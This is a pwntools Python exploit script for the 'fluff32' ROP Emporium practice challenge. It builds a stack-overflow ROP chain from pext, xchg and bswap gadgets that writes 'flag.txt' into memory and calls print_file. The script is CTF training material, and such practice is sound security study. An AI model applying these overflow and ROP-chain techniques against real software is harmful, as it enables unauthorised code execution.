from pwn import *

DEBUG = False

elf = ELF("./fluff32")
gs = """
b *pwnme+177
b *print_file
"""
if DEBUG:
    io = gdb.debug(elf.path, gdbscript=gs)
else:
    io = process(elf.path)

# found using ropper
pop_ebx = 0x08048399        # pop ebx; ret;
pext_gadget = 0x0804854a    # pext edx, ebx, eax; mov eax, 0xdeadbeef; ret;
                            # Parallel extract of bits from ebx using mask in eax, result is written to edx.
xchg_gadget = 0x08048555    # xchg byte ptr [ecx], dl; ret;
pop_bswap_ecx = 0x08048558  # pop ecx; bswap ecx; ret;
                            # BSWAP - Reverses the byte order of a 32-bit register.
            
bytes_str = b"flag.txt\0"
write_loc = 0x0804a020  # .bss
offset = 44
payload = cyclic(offset)

payload += p32(pext_gadget)  # set eax to 0xdeadbeef
for i, byte in enumerate(bytes_str):
    ecx = p32(write_loc + i)[::-1]  # reverse the bytes for the bswap
    payload += p32(pop_bswap_ecx) + ecx
    
    # pext dest, src1, mask;
    # pext edx, ebx, eax;
    dest = byte 
    src1 = 0
    mask = 0xdeadbeef  # The gadget includes: mov eax, 0xdeadbeef;
    shift = 0   
    while dest > 0:
        while mask & 1 == 0:
            mask >>= 1
            shift += 1
        if dest & 1:
            src1 |= (1 << shift)
        dest >>= 1
        mask >>= 1
        shift += 1
    # print('src1:', bin(src1))
    # print('mask:', bin(0xdeadbeef))
    # print('dest:', bin(byte))
    # print()
    payload += p32(pop_ebx) + p32(src1)
    payload += p32(pext_gadget) + p32(xchg_gadget) 

payload += p32(elf.sym.print_file) + b'AAAA' + p32(write_loc)

io.sendline(payload)
io.wait()  # for debugging in gdb
io.recvuntil("Thank you!\n")
print(io.recv().decode())
